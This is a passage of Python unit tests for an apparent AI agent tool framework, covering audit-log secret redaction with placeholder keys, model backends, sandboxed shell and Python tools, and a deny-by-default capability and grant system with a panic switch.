        entries = audit_log.tail(1)
        assert entries[0]["tool_name"] == "git"
        assert entries[0]["action"] == "push"
        assert entries[0]["session_id"] == "abc123"

    def test_log_timestamp_is_iso(self, audit_log):
        audit_log.log(AuditEntry(event_type="test"))
        entry = audit_log.tail(1)[0]
        assert "T" in entry["timestamp"]  # ISO format


class TestAuditTail:
    def test_tail_empty_log(self, audit_log):
        assert audit_log.tail() == []

    def test_tail_returns_last_n(self, audit_log):
        for i in range(10):
            audit_log.log(AuditEntry(event_type=f"event_{i}"))
        entries = audit_log.tail(3)
        assert len(entries) == 3
        assert entries[0]["event_type"] == "event_7"
        assert entries[2]["event_type"] == "event_9"

    def test_tail_all_when_fewer(self, audit_log):
        audit_log.log(AuditEntry(event_type="only"))
        entries = audit_log.tail(100)
        assert len(entries) == 1

    def test_tail_nonexistent_file(self, tmp_path):
        logger = AuditLogger(path=tmp_path / "nope.jsonl")
        assert logger.tail() == []


class TestSecretRedaction:
    def test_redact_openai_key(self, audit_log):
        audit_log.log(AuditEntry(
            event_type="test",
            detail="key is sk-abc12345678901234567890",
        ))
        entry = audit_log.tail(1)[0]
        assert "sk-abc" not in entry["detail"]
        assert "[REDACTED]" in entry["detail"]

    def test_redact_github_token(self, audit_log):
        audit_log.log(AuditEntry(
            event_type="test",
            detail="token ghp_abcdefghijklmnopqrstuvwxyz012345678901",
        ))
        entry = audit_log.tail(1)[0]
        assert "ghp_" not in entry["detail"]
        assert "[REDACTED]" in entry["detail"]

    def test_redact_aws_key(self, audit_log):
        audit_log.log(AuditEntry(
            event_type="test",
            detail="aws AKIAIOSFODNN7EXAMPLE",
        ))
        entry = audit_log.tail(1)[0]
        assert "AKIA" not in entry["detail"]
        assert "[REDACTED]" in entry["detail"]

    def test_redact_slack_token(self, audit_log):
        audit_log.log(AuditEntry(
            event_type="test",
            detail="slack xoxb-123-456-abc",
        ))
        entry = audit_log.tail(1)[0]
        assert "xoxb-" not in entry["detail"]
        assert "[REDACTED]" in entry["detail"]

    def test_no_redaction_for_safe_text(self, audit_log):
        audit_log.log(AuditEntry(
            event_type="test",
            detail="just a normal command: ls -la",
        ))
        entry = audit_log.tail(1)[0]
        assert entry["detail"] == "just a normal command: ls -la"

    def test_multiple_secrets_redacted(self, audit_log):
        audit_log.log(AuditEntry(
            event_type="test",
            detail="key1=sk-aaaabbbbccccddddeeeefffff key2=AKIAIOSFODNN7EXAMPLE",
        ))
        entry = audit_log.tail(1)[0]
        assert entry["detail"].count("[REDACTED]") == 2

```

## `tests/test_backends.py`

```python
# tests/test_backends.py — Tests for backend implementations

import pytest
from types import SimpleNamespace
from unittest.mock import MagicMock

from core.runtime.backends.base import BackendCapabilities
from core.runtime.backends.openai_backend import OpenAIBackend
from core.runtime.backends.mistral_backend import MistralBackend
from core.runtime.backends.local_backend import LocalBackend


class TestOpenAIBackend:
    def test_injected_client(self):
        mock = MagicMock()
        backend = OpenAIBackend(openai_client=mock)
        assert backend.client is mock

    def test_non_streaming(self):
        mock = MagicMock()
        mock.chat.completions.create.return_value = SimpleNamespace(
            choices=[SimpleNamespace(message=SimpleNamespace(content="hi"))]
        )
        backend = OpenAIBackend(openai_client=mock)
        result = backend.chat("gpt-4o-mini", [{"role": "user", "content": "hello"}])
        assert result == "hi"
        mock.chat.completions.create.assert_called_once_with(
            model="gpt-4o-mini",
            messages=[{"role": "user", "content": "hello"}],
        )

    def test_streaming(self):
        mock = MagicMock()
        chunks = [
            SimpleNamespace(choices=[SimpleNamespace(delta=SimpleNamespace(content="a"))]),
            SimpleNamespace(choices=[SimpleNamespace(delta=SimpleNamespace(content="b"))]),
        ]
        mock.chat.completions.create.return_value = iter(chunks)
        backend = OpenAIBackend(openai_client=mock)
        result = list(backend.chat("gpt-4o-mini", [{"role": "user", "content": "hi"}], stream=True))
        assert len(result) == 2
        mock.chat.completions.create.assert_called_once_with(
            model="gpt-4o-mini",
            messages=[{"role": "user", "content": "hi"}],
            stream=True,
        )

    def test_missing_key_raises(self):
        with pytest.raises(RuntimeError, match="Missing OPENAI_API_KEY"):
            OpenAIBackend()

    def test_capabilities(self):
        mock = MagicMock()
        backend = OpenAIBackend(openai_client=mock)
        caps = backend.capabilities
        assert caps.supports_streaming is True
        assert caps.supports_json_mode is True
        assert caps.supports_tool_calls is True


class TestMistralBackend:
    def test_missing_key_raises(self):
        with pytest.raises(RuntimeError, match="Missing MISTRAL_API_KEY"):
            MistralBackend()

    def test_capabilities(self, monkeypatch):
        monkeypatch.setenv("MISTRAL_API_KEY", "test-key")
        backend = MistralBackend()
        caps = backend.capabilities
        assert caps.supports_streaming is True
        assert caps.supports_json_mode is True
        assert caps.supports_tool_calls is False


class TestLocalBackend:
    def test_chat_raises_not_implemented(self):
        backend = LocalBackend()
        with pytest.raises(NotImplementedError, match="Phase 8"):
            backend.chat("local-model", [{"role": "user", "content": "hi"}])

    def test_capabilities(self):
        backend = LocalBackend()
        caps = backend.capabilities
        assert caps.supports_streaming is False
        assert caps.supports_json_mode is False
        assert caps.supports_tool_calls is False

    def test_custom_endpoint(self):
        backend = LocalBackend(endpoint="http://myhost:9000")
        assert backend.endpoint == "http://myhost:9000"

    def test_default_endpoint(self):
        backend = LocalBackend()
        assert backend.endpoint == "http://localhost:8000"

```

## `tests/test_base_subprocess.py`

```python
# tests/test_base_subprocess.py

import subprocess
import pytest
from pathlib import Path

from core.tools.run_shell import RunShellTool
from core.tools.run_python import RunPythonTool
from core.tools.base_subprocess import RunSubprocessTool
from tests.conftest import make_fake_subprocess_runner


class TestRunShellToolWithFakeRunner:
    def test_shell_success(self):
        runner = make_fake_subprocess_runner(rc=0, stdout="hello world", stderr="")
        tool = RunShellTool(subprocess_runner=runner)
        rc, out, err = tool.run("echo hello")
        assert rc == 0
        assert out == "hello world"

    def test_shell_failure(self):
        runner = make_fake_subprocess_runner(rc=1, stdout="", stderr="command not found")
        tool = RunShellTool(subprocess_runner=runner)
        rc, out, err = tool.run("badcmd")
        assert rc == 1
        assert "command not found" in err

    def test_shell_timeout(self):
        def timeout_runner(cmd, *, shell, timeout, executable):
            raise subprocess.TimeoutExpired(cmd, timeout)
        tool = RunShellTool(subprocess_runner=timeout_runner)
        rc, out, err = tool.run("sleep 999")
        assert rc == -1
        assert "timed out" in err.lower()

    def test_shell_exception(self):
        def error_runner(cmd, *, shell, timeout, executable):
            raise OSError("disk on fire")
        tool = RunShellTool(subprocess_runner=error_runner)
        rc, out, err = tool.run("anything")
        assert rc == -1
        assert "OSError" in err


class TestRunPythonToolWithFakeRunner:
    def test_python_tool_skip_venv(self):
        """RunPythonTool with skip_venv_setup should not try to create a venv."""
        runner = make_fake_subprocess_runner(rc=0, stdout="42", stderr="")
        tool = RunPythonTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=runner,
        )
        assert tool.name == "run_python_code"

    def test_python_run_delegates_to_runner(self):
        runner = make_fake_subprocess_runner(rc=0, stdout="result", stderr="")
        tool = RunPythonTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=runner,
        )
        rc, out, err = tool.run(["python", "script.py"])
        assert rc == 0
        assert out == "result"


class TestExtractCode:
    def test_extract_python_block(self):
        text = "Here is the code:\n```python\nprint('hello')\n```\nDone."
        assert RunSubprocessTool.extract_code(text, "python") == "print('hello')"

    def test_extract_generic_block(self):
        text = "```\nls -la\n```"
        assert RunSubprocessTool.extract_code(text) == "ls -la"

    def test_extract_inline_code(self):
        text = "Run `echo hi` to test"
        assert RunSubprocessTool.extract_code(text) == "echo hi"

    def test_extract_plain_text(self):
        text = "echo hello world"
        assert RunSubprocessTool.extract_code(text) == "echo hello world"

```

## `tests/test_bus.py`

```python
# tests/test_bus.py

import pytest
from unittest.mock import MagicMock

from core.tools.bus import ToolBus, ToolResult
from core.tools.descriptors import ToolDescriptor, SandboxProfile
from core.tools.capability import CapabilityEngine
from core.tools.sandbox import NoneSandbox
from core.contracts.schemas import PermissionGrant, PolicyPack


class TestToolResult:
    def test_basic_result(self):
        r = ToolResult(exit_code=0, stdout="ok", stderr="", tool_name="test")
        assert r.exit_code == 0
        assert r.stdout == "ok"
        assert r.tool_name == "test"
        assert r.granted_scopes == []

    def test_result_with_scopes(self):
        r = ToolResult(
            exit_code=0, stdout="", stderr="",
            tool_name="t", granted_scopes=["a.b"],
        )
        assert r.granted_scopes == ["a.b"]


class TestToolBusRegistration:
    def test_register_and_list(self):
        bus = ToolBus()
        desc = ToolDescriptor(tool_name="test_tool")
        bus.register(desc, lambda: None)
        assert "test_tool" in bus.list_tools()

    def test_list_empty(self):
        bus = ToolBus()
        assert bus.list_tools() == []

    def test_register_multiple(self):
        bus = ToolBus()
        bus.register(ToolDescriptor(tool_name="a"), lambda: None)
        bus.register(ToolDescriptor(tool_name="b"), lambda: None)
        assert len(bus.list_tools()) == 2

    def test_describe_tool(self):
        bus = ToolBus()
        desc = ToolDescriptor(
            tool_name="t", description="A test tool",
            required_scopes=["x.y"],
        )
        bus.register(desc, lambda: None)
        info = bus.describe_tool("t")
        assert info["name"] == "t"
        assert info["description"] == "A test tool"
        assert "x.y" in info["required_scopes"]

    def test_describe_unknown_tool(self):
        bus = ToolBus()
        info = bus.describe_tool("nope")
        assert "error" in info

    def test_get_descriptor(self):
        bus = ToolBus()
        desc = ToolDescriptor(tool_name="t")
        bus.register(desc, lambda: None)
        assert bus.get_descriptor("t") is desc

    def test_get_descriptor_missing(self):
        bus = ToolBus()
        assert bus.get_descriptor("nope") is None


class TestToolBusDispatch:
    def _make_permissive_bus(self):
        """Bus with all scopes allowed."""
        policy = PolicyPack(allowed_scopes=[
            "shell.exec", "python.exec", "pip.install",
            "http.read", "fs.read", "audio.output",
        ])
        engine = CapabilityEngine(policy)
        return ToolBus(capability_engine=engine)

    def test_dispatch_unknown_tool(self):
        bus = ToolBus()
        result = bus.dispatch("nonexistent")
        assert result.exit_code == -1
        import json
        error = json.loads(result.stderr)
        assert error["error"] == "unknown_tool"

    def test_dispatch_tuple_result(self):
        bus = self._make_permissive_bus()
        desc = ToolDescriptor(tool_name="t", required_scopes=["shell.exec"])
        bus.register(desc, lambda cmd: (0, "output", ""))
        result = bus.dispatch("t", "echo hi")
        assert result.exit_code == 0
        assert result.stdout == "output"
        assert result.tool_name == "t"
        assert "shell.exec" in result.granted_scopes

    def test_dispatch_string_result(self):
        bus = self._make_permissive_bus()
        desc = ToolDescriptor(tool_name="t", required_scopes=["fs.read"])
        bus.register(desc, lambda: "some text")
        result = bus.dispatch("t")
        assert result.exit_code == 0
        assert result.stdout == "some text"

    def test_dispatch_executor_exception(self):
        bus = self._make_permissive_bus()
        desc = ToolDescriptor(tool_name="t", required_scopes=["shell.exec"])
        bus.register(desc, lambda: (_ for _ in ()).throw(RuntimeError("boom")))
        result = bus.dispatch("t")
        assert result.exit_code == -1
        assert "RuntimeError" in result.stderr

    def test_dispatch_with_kwargs(self):
        bus = self._make_permissive_bus()
        desc = ToolDescriptor(tool_name="t", required_scopes=["shell.exec"])

        def executor(cmd, timeout=None):
            return (0, f"ran with timeout={timeout}", "")

        bus.register(desc, executor)
        result = bus.dispatch("t", "ls", timeout=30)
        assert "timeout=30" in result.stdout

    def test_no_scopes_always_allowed(self):
        """Tools with no required scopes bypass capability check."""
        bus = ToolBus()  # default deny-all engine
        desc = ToolDescriptor(tool_name="t", required_scopes=[])
        bus.register(desc, lambda: (0, "ok", ""))
        result = bus.dispatch("t")
        assert result.exit_code == 0


class TestToolBusCapabilityGating:
    def test_denied_returns_structured_error(self):
        engine = CapabilityEngine()  # deny-by-default
        bus = ToolBus(capability_engine=engine)
        desc = ToolDescriptor(
            tool_name="run_shell_command",
            required_scopes=["shell.exec"],
        )
        bus.register(desc, lambda cmd: (0, "ok", ""))
        result = bus.dispatch("run_shell_command", "ls")
        assert result.exit_code == -1
        import json
        denial = json.loads(result.stderr)
        assert denial["error"] == "capability_denied"
        assert denial["tool"] == "run_shell_command"
        assert "shell.exec" in denial["missing_scopes"]
        assert result.evidence is not None

    def test_granted_allows_execution(self):
        engine = CapabilityEngine()
        engine.add_grant(PermissionGrant(
            tool_name="run_shell_command", scope="shell.exec",
        ))
        bus = ToolBus(capability_engine=engine)
        desc = ToolDescriptor(
            tool_name="run_shell_command",
            required_scopes=["shell.exec"],
        )
        bus.register(desc, lambda cmd: (0, "ok", ""))
        result = bus.dispatch("run_shell_command", "ls")
        assert result.exit_code == 0

    def test_partial_grant_denied(self):
        engine = CapabilityEngine()
        engine.add_grant(PermissionGrant(
            tool_name="install_project", scope="python.exec",
        ))
        bus = ToolBus(capability_engine=engine)
        desc = ToolDescriptor(
            tool_name="install_project",
            required_scopes=["python.exec", "pip.install"],
        )
        bus.register(desc, lambda path: (0, "ok", ""))
        result = bus.dispatch("install_project", ".")
        assert result.exit_code == -1
        assert "pip.install" in result.stderr

    def test_policy_allows_bypass(self):
        policy = PolicyPack(allowed_scopes=["shell.exec"])
        engine = CapabilityEngine(policy)
        bus = ToolBus(capability_engine=engine)
        desc = ToolDescriptor(
            tool_name="run_shell_command",
            required_scopes=["shell.exec"],
        )
        bus.register(desc, lambda cmd: (0, "ok", ""))
        result = bus.dispatch("run_shell_command", "ls")
        assert result.exit_code == 0


class TestToolBusNetworkGating:
    def test_network_denied(self):
        """Network tool denied when http.read not granted."""
        engine = CapabilityEngine()
        bus = ToolBus(capability_engine=engine)
        desc = ToolDescriptor(
            tool_name="perform_web_search",
            required_scopes=["http.read"],
            requires_network=True,
            network_scopes=["http.read"],
        )
        bus.register(desc, lambda q: "results")
        result = bus.dispatch("perform_web_search", "test")
        assert result.exit_code == -1
        assert "denied" in result.stderr.lower()

    def test_network_allowed(self):
        policy = PolicyPack(allowed_scopes=["http.read"])
        engine = CapabilityEngine(policy)
        bus = ToolBus(capability_engine=engine)
        desc = ToolDescriptor(
            tool_name="perform_web_search",
            required_scopes=["http.read"],
            requires_network=True,
            network_scopes=["http.read"],
        )
        bus.register(desc, lambda q: "results")
        result = bus.dispatch("perform_web_search", "test")
        assert result.exit_code == 0
        assert result.stdout == "results"


class TestToolBusActionAwareDispatch:
    """Phase 4a: action-aware dispatch for multi-action tools."""

    def _make_bus_with_scopes(self, scopes):
        policy = PolicyPack(allowed_scopes=scopes)
        engine = CapabilityEngine(policy)
        return ToolBus(capability_engine=engine)

    def test_action_specific_scope_check(self):
        bus = self._make_bus_with_scopes(["git.read"])
        desc = ToolDescriptor(
            tool_name="git",
            required_scopes=["git.read", "git.write", "git.push", "git.fetch"],
            action_scopes={
                "status": ["git.read"],
                "commit": ["git.write"],
            },
        )
        bus.register(desc, lambda action, **kw: (0, f"did {action}", ""))
        # git.read is granted — status should work
        result = bus.dispatch("git", action="status")
        assert result.exit_code == 0
        assert result.stdout == "did status"
        assert result.granted_scopes == ["git.read"]

    def test_action_denied_when_scope_missing(self):
        bus = self._make_bus_with_scopes(["git.read"])
        desc = ToolDescriptor(
            tool_name="git",
            required_scopes=["git.read", "git.write"],
            action_scopes={
                "status": ["git.read"],
                "commit": ["git.write"],
            },
        )
        bus.register(desc, lambda action, **kw: (0, "ok", ""))
        # git.write not granted — commit should be denied
        result = bus.dispatch("git", action="commit")
        assert result.exit_code == -1
        import json
        denial = json.loads(result.stderr)
        assert denial["error"] == "capability_denied"
        assert "git.write" in denial["missing_scopes"]
        assert denial["action"] == "commit"

    def test_no_action_uses_full_scopes(self):
        bus = self._make_bus_with_scopes(["fs.read"])
        desc = ToolDescriptor(
            tool_name="fs",
            required_scopes=["fs.read", "fs.write", "fs.delete"],
            action_scopes={"read": ["fs.read"]},
        )
        bus.register(desc, lambda: (0, "ok", ""))
        # Without action, checks all required_scopes — fs.write/delete missing
        result = bus.dispatch("fs")
        assert result.exit_code == -1

    def test_unknown_action_falls_back_to_required_scopes(self):
        bus = self._make_bus_with_scopes(["git.read", "git.write", "git.push", "git.fetch"])
        desc = ToolDescriptor(
            tool_name="git",
            required_scopes=["git.read", "git.write", "git.push", "git.fetch"],
            action_scopes={"status": ["git.read"]},
        )
        bus.register(desc, lambda action, **kw: (0, "ok", ""))
        # Unknown action falls back to full required_scopes
        result = bus.dispatch("git", action="unknown_action")
        assert result.exit_code == 0

    def test_action_passes_to_executor(self):
        bus = self._make_bus_with_scopes(["verify.run"])
        desc = ToolDescriptor(
            tool_name="verify",
            required_scopes=["verify.run"],
            action_scopes={"lint": ["verify.run"]},
        )
        captured = {}
        def executor(action, **kwargs):
            captured["action"] = action
            return (0, "ok", "")
        bus.register(desc, executor)
        bus.dispatch("verify", action="lint")
        assert captured["action"] == "lint"

    def test_describe_tool_includes_actions(self):
        bus = ToolBus()
        desc = ToolDescriptor(
            tool_name="git",
            action_scopes={"status": ["git.read"], "commit": ["git.write"]},
        )
        bus.register(desc, lambda: None)
        info = bus.describe_tool("git")
        assert "actions" in info
        assert "status" in info["actions"]
        assert "commit" in info["actions"]

    def test_structured_unknown_tool_error(self):
        bus = ToolBus()
        result = bus.dispatch("nonexistent")
        assert result.exit_code == -1
        import json
        error = json.loads(result.stderr)
        assert error["error"] == "unknown_tool"

    def test_evidence_field_on_denial(self):
        bus = ToolBus()
        desc = ToolDescriptor(tool_name="t", required_scopes=["x.y"])
        bus.register(desc, lambda: (0, "ok", ""))
        result = bus.dispatch("t")
        assert result.exit_code == -1
        assert result.evidence is not None
        import json
        evidence = json.loads(result.evidence)
        assert evidence["error"] == "capability_denied"


class TestToolBusProperties:
    def test_capability_engine_property(self):
        engine = CapabilityEngine()
        bus = ToolBus(capability_engine=engine)
        assert bus.capability_engine is engine

    def test_sandbox_property(self):
        sandbox = NoneSandbox()
        bus = ToolBus(sandbox=sandbox)
        assert bus.sandbox is sandbox

    def test_default_engine_and_sandbox(self):
        bus = ToolBus()
        assert isinstance(bus.capability_engine, CapabilityEngine)
        assert isinstance(bus.sandbox, NoneSandbox)

```

## `tests/test_bus_grants.py`

```python
# tests/test_bus_grants.py
# End-to-end: ToolBus + SessionManager grant persistence + replay

import json
import pytest
from datetime import datetime, timezone, timedelta
from pathlib import Path

from core.tools.bus import ToolBus, ToolResult
from core.tools.capability import CapabilityEngine
from core.tools.descriptors import ToolDescriptor
from core.contracts.schemas import PermissionGrant, PolicyPack, ToolTrace
from core.sessions.manager import SessionManager


@pytest.fixture
def session_mgr(tmp_path):
    return SessionManager(tmp_path)


@pytest.fixture
def engine():
    return CapabilityEngine()


@pytest.fixture
def bus(engine):
    bus = ToolBus(capability_engine=engine)
    desc = ToolDescriptor(
        tool_name="test_tool",
        required_scopes=["test.scope"],
        description="A test tool",
    )
    bus.register(desc, lambda: (0, "ok", ""))
    return bus


class TestGrantPersistence:
    def test_write_grant_to_session(self, session_mgr):
        grant = PermissionGrant(tool_name="test_tool", scope="test.scope")
        path = session_mgr.write_grant(grant)
        assert path.exists()
        data = json.loads(path.read_text())
        assert data["tool_name"] == "test_tool"
        assert data["scope"] == "test.scope"

    def test_write_multiple_grants(self, session_mgr):
        g1 = PermissionGrant(tool_name="a", scope="x")
        g2 = PermissionGrant(tool_name="b", scope="y")
        p1 = session_mgr.write_grant(g1)
        p2 = session_mgr.write_grant(g2)
        assert "grant_000" in p1.name
        assert "grant_001" in p2.name

    def test_load_grants(self, session_mgr):
        g1 = PermissionGrant(tool_name="a", scope="x")
        g2 = PermissionGrant(tool_name="b", scope="y")
        session_mgr.write_grant(g1)
        session_mgr.write_grant(g2)
        loaded = session_mgr.load_grants()
        assert len(loaded) == 2
        assert loaded[0]["tool_name"] == "a"
        assert loaded[1]["tool_name"] == "b"


class TestGrantReplay:
    def test_replay_grants_into_engine(self, session_mgr, engine, bus):
        """Save grants, load them, inject into engine, verify tool dispatch works."""
        # 1. Write grant
        grant = PermissionGrant(tool_name="test_tool", scope="test.scope")
        session_mgr.write_grant(grant)

        # 2. Load grants from session
        raw_grants = session_mgr.load_grants()
        grants = [PermissionGrant(**g) for g in raw_grants]

        # 3. New engine for replay
        replay_engine = CapabilityEngine()
        replay_engine.load_grants(grants)

        # 4. Create new bus with replayed engine
        replay_bus = ToolBus(capability_engine=replay_engine)
        desc = ToolDescriptor(
            tool_name="test_tool",
            required_scopes=["test.scope"],
        )
        replay_bus.register(desc, lambda: (0, "replayed", ""))

        # 5. Dispatch should succeed
        result = replay_bus.dispatch("test_tool")
        assert result.exit_code == 0
        assert result.stdout == "replayed"

    def test_replay_without_grant_denied(self, engine, bus):
        """Without replayed grants, tool dispatch is denied."""
        result = bus.dispatch("test_tool")
        assert result.exit_code == -1
        import json
        denial = json.loads(result.stderr)
        assert denial["error"] == "capability_denied"


class TestTimeScopedGrantReplay:
    def test_fresh_time_scoped_grant_works(self, session_mgr, engine, bus):
        grant = PermissionGrant(
            tool_name="test_tool", scope="test.scope",
            grant_duration_seconds=3600.0,
        )
        session_mgr.write_grant(grant)

        raw = session_mgr.load_grants()
        replay_engine = CapabilityEngine()
        replay_engine.load_grants([PermissionGrant(**g) for g in raw])

        replay_bus = ToolBus(capability_engine=replay_engine)
        replay_bus.register(
            ToolDescriptor(tool_name="test_tool", required_scopes=["test.scope"]),
            lambda: (0, "ok", ""),
        )
        result = replay_bus.dispatch("test_tool")
        assert result.exit_code == 0

    def test_expired_time_scoped_grant_denied(self, session_mgr):
        grant = PermissionGrant(
            tool_name="test_tool", scope="test.scope",
            grant_issued_at=datetime.now(timezone.utc) - timedelta(hours=2),
            grant_duration_seconds=60.0,
        )
        session_mgr.write_grant(grant)

        raw = session_mgr.load_grants()
        engine = CapabilityEngine()
        engine.load_grants([PermissionGrant(**g) for g in raw])

        bus = ToolBus(capability_engine=engine)
        bus.register(
            ToolDescriptor(tool_name="test_tool", required_scopes=["test.scope"]),
            lambda: (0, "ok", ""),
        )
        result = bus.dispatch("test_tool")
        assert result.exit_code == -1


class TestInvocationScopedGrantReplay:
    def test_invocation_grant_consumed_after_one_use(self, session_mgr):
        grant = PermissionGrant(
            tool_name="test_tool", scope="test.scope",
            grant_scope="invocation",
        )
        session_mgr.write_grant(grant)

        raw = session_mgr.load_grants()
        engine = CapabilityEngine()
        engine.load_grants([PermissionGrant(**g) for g in raw])

        bus = ToolBus(capability_engine=engine)
        bus.register(
            ToolDescriptor(tool_name="test_tool", required_scopes=["test.scope"]),
            lambda: (0, "ok", ""),
        )

        # First call succeeds
        r1 = bus.dispatch("test_tool")
        assert r1.exit_code == 0

        # Second call denied
        r2 = bus.dispatch("test_tool")
        assert r2.exit_code == -1


class TestToolTracePersistence:
    def test_write_and_load_traces(self, session_mgr):
        trace = ToolTrace(
            tool_name="test_tool",
            payload_summary="echo hello",
            exit_code=0,
            stdout_excerpt="hello",
            scopes_used=["shell.exec"],
        )
        path = session_mgr.write_tool_trace(trace)
        assert path.exists()

        traces = session_mgr.load_tool_traces()
        assert len(traces) == 1
        assert traces[0]["tool_name"] == "test_tool"
        assert traces[0]["exit_code"] == 0

    def test_multiple_traces(self, session_mgr):
        for i in range(3):
            trace = ToolTrace(tool_name=f"tool_{i}", exit_code=i)
            session_mgr.write_tool_trace(trace)
        traces = session_mgr.load_tool_traces()
        assert len(traces) == 3

```

## `tests/test_bus_preflight.py`

```python
# tests/test_bus_preflight.py — Preflight hooks, panic, audit in ToolBus

import json
import pytest

from core.tools.bus import ToolBus, ToolResult
from core.tools.descriptors import ToolDescriptor, HIGH_RISK_ACTIONS
from core.tools.capability import CapabilityEngine
from core.contracts.schemas import PolicyPack, AuditEntry
from core.policy.audit import AuditLogger
from core.policy.god_mode import GodModeSession


@pytest.fixture
def permissive_engine():
    return CapabilityEngine(PolicyPack(allowed_scopes=[
        "git.read", "git.write", "git.push", "git.fetch",
        "fs.read", "fs.write", "fs.delete",
    ]))


@pytest.fixture
def audit(tmp_path):
    return AuditLogger(path=tmp_path / "audit.jsonl")


@pytest.fixture
def god(audit):
    return GodModeSession(audit)


GIT_DESC = ToolDescriptor(
    tool_name="git",
    required_scopes=["git.read", "git.write", "git.push", "git.fetch"],
    action_scopes={
        "status": ["git.read"],
        "push": ["git.push"],
        "reset": ["git.write"],
    },
)


class TestPreflightHook:
    def test_high_risk_action_triggers_preflight(self, permissive_engine):
        captured = []
        bus = ToolBus(
            capability_engine=permissive_engine,
            preflight_hook=lambda ann: captured.append(ann),
        )
        bus.register(GIT_DESC, lambda action, **kw: (0, "ok", ""))
        bus.dispatch("git", action="push")
        assert len(captured) == 1
        assert captured[0]["type"] == "preflight"
        assert captured[0]["tool"] == "git"
        assert captured[0]["action"] == "push"

    def test_safe_action_no_preflight(self, permissive_engine):
        captured = []
        bus = ToolBus(
            capability_engine=permissive_engine,
            preflight_hook=lambda ann: captured.append(ann),
        )
        bus.register(GIT_DESC, lambda action, **kw: (0, "ok", ""))
        bus.dispatch("git", action="status")
        assert len(captured) == 0

    def test_no_hook_no_error(self, permissive_engine):
        bus = ToolBus(capability_engine=permissive_engine)
        bus.register(GIT_DESC, lambda action, **kw: (0, "ok", ""))
        result = bus.dispatch("git", action="push")
        assert result.exit_code == 0


class TestPanicSwitch:
    def test_panic_blocks_all_dispatch(self, permissive_engine, audit, god):
        god.activate(reason="test", capability_engine=permissive_engine)
        god.panic(capability_engine=permissive_engine)

        bus = ToolBus(
            capability_engine=permissive_engine,
            god_mode=god,
        )
        bus.register(GIT_DESC, lambda action, **kw: (0, "ok", ""))
        result = bus.dispatch("git", action="status")
        assert result.exit_code == -1
        error = json.loads(result.stderr)
        assert error["error"] == "panic_revoked"

    def test_panic_blocks_even_safe_tools(self, audit, god):
        engine = CapabilityEngine(PolicyPack(allowed_scopes=["fs.read"]))
        god.activate(reason="test", capability_engine=engine)
        god.panic(capability_engine=engine)

        bus = ToolBus(capability_engine=engine, god_mode=god)
        desc = ToolDescriptor(tool_name="t", required_scopes=["fs.read"])
        bus.register(desc, lambda: (0, "ok", ""))
        result = bus.dispatch("t")
        assert result.exit_code == -1

    def test_no_god_mode_no_panic_check(self, permissive_engine):
        bus = ToolBus(capability_engine=permissive_engine)
        bus.register(GIT_DESC, lambda action, **kw: (0, "ok", ""))
        result = bus.dispatch("git", action="status")
        assert result.exit_code == 0


class TestBusAuditLogging:
    def test_successful_dispatch_logged(self, permissive_engine, audit):
        bus = ToolBus(capability_engine=permissive_engine, audit=audit)
        bus.register(GIT_DESC, lambda action, **kw: (0, "ok", ""))
        bus.dispatch("git", action="status")
        entries = audit.tail()
        assert len(entries) >= 1
        assert entries[-1]["event_type"] == "tool_dispatch"
        assert entries[-1]["verdict"] == "allowed"
        assert entries[-1]["tool_name"] == "git"
        assert entries[-1]["action"] == "status"

    def test_denied_dispatch_logged(self, audit):
        engine = CapabilityEngine()  # deny all
        bus = ToolBus(capability_engine=engine, audit=audit)
        bus.register(GIT_DESC, lambda action, **kw: (0, "ok", ""))
        bus.dispatch("git", action="push")
        entries = audit.tail()
        assert any(e["verdict"] == "denied" for e in entries)

    def test_panic_dispatch_logged(self, permissive_engine, audit, god):
        god.activate(reason="test", capability_engine=permissive_engine)
        god.panic(capability_engine=permissive_engine)
        bus = ToolBus(
            capability_engine=permissive_engine,
            god_mode=god,
            audit=audit,
        )
        bus.register(GIT_DESC, lambda action, **kw: (0, "ok", ""))
        bus.dispatch("git", action="status")
        entries = audit.tail()
        verdicts = [e["verdict"] for e in entries]
        assert "panic_revoked" in verdicts

    def test_no_audit_no_error(self, permissive_engine):
        bus = ToolBus(capability_engine=permissive_engine)
        bus.register(GIT_DESC, lambda action, **kw: (0, "ok", ""))
        result = bus.dispatch("git", action="status")
        assert result.exit_code == 0

```

## `tests/test_capability.py`

```python
# tests/test_capability.py

import time
import pytest
from datetime import datetime, timezone, timedelta

from core.tools.capability import CapabilityEngine, CapabilityVerdict
from core.contracts.schemas import PermissionGrant, PolicyPack


class TestCapabilityVerdict:
    def test_allowed_verdict(self):
        v = CapabilityVerdict(allowed=True, reason="ok")
        assert v.allowed is True
        assert v.denied_scopes == []

    def test_denied_verdict(self):
        v = CapabilityVerdict(allowed=False, denied_scopes=["shell.exec"])
        assert v.allowed is False
        assert "shell.exec" in v.denied_scopes


class TestCapabilityEngineDefaults:
    def test_default_denies_all(self):
        engine = CapabilityEngine()
        result = engine.check("run_shell_command", ["shell.exec"])
        assert result.allowed is False
        assert "shell.exec" in result.denied_scopes

    def test_no_scopes_always_allowed(self):
        engine = CapabilityEngine()
        result = engine.check("any_tool", [])
        assert result.allowed is True

    def test_empty_policy(self):
        engine = CapabilityEngine(PolicyPack())
        result = engine.check("tool", ["scope.a"])
        assert result.allowed is False


class TestCapabilityEnginePolicy:
    def test_policy_allows_scope(self):
        policy = PolicyPack(allowed_scopes=["shell.exec"])
        engine = CapabilityEngine(policy)
        result = engine.check("run_shell_command", ["shell.exec"])
        assert result.allowed is True

    def test_policy_partial_coverage(self):
        policy = PolicyPack(allowed_scopes=["shell.exec"])
        engine = CapabilityEngine(policy)
        result = engine.check("tool", ["shell.exec", "net.any"])
        assert result.allowed is False
        assert "net.any" in result.denied_scopes
        assert "shell.exec" not in result.denied_scopes

    def test_policy_multiple_scopes(self):
        policy = PolicyPack(allowed_scopes=["python.exec", "pip.install"])
        engine = CapabilityEngine(policy)
        result = engine.check("install_project", ["python.exec", "pip.install"])
        assert result.allowed is True

    def test_policy_property(self):
        policy = PolicyPack(allowed_scopes=["a"])
        engine = CapabilityEngine(policy)
        assert engine.policy is policy


class TestCapabilityEngineGrants:
    def test_add_grant_allows_scope(self):
        engine = CapabilityEngine()
        grant = PermissionGrant(tool_name="run_shell_command", scope="shell.exec")
        engine.add_grant(grant)
        result = engine.check("run_shell_command", ["shell.exec"])
        assert result.allowed is True

    def test_grant_wrong_tool(self):
        engine = CapabilityEngine()
        grant = PermissionGrant(tool_name="other_tool", scope="shell.exec")
